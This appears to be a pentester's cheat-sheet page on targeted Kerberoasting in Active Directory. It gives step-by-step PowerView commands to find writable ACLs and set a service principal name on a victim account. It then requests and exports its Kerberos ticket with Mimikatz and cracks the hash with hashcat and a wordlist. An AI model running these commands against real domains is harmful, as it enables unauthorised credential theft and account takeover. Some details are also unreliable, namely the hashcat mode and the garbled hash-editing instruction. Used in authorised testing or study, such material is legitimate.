# 🟢 Set SPN

### **Enumerate permissions for the group on ACL**

{% code overflow="wrap" %}
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```
{% endcode %}

### **Check if the user has SPN**

```
. ./Powerview_dev.ps1
Get-DomainUser -Identity <username> | select samaccountname, serviceprincipalname
```

of

```
Get-NetUser | Where-Object {$_.servicePrincipalName}
```

### **Set SPN for the user**

```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
```

### **Request a TGS**

{% code overflow="wrap" %}
```
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
```
{% endcode %}

### **Export ticket to disk for offline cracking**

```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

### **Request TGS hash for offline cracking hashcat**

{% code overflow="wrap" %}
```
Get-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProperty Hash
```
{% endcode %}

### **Crack the hash with hashcat**

Edit the hash by inserting '23' after the kerbrs

```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```
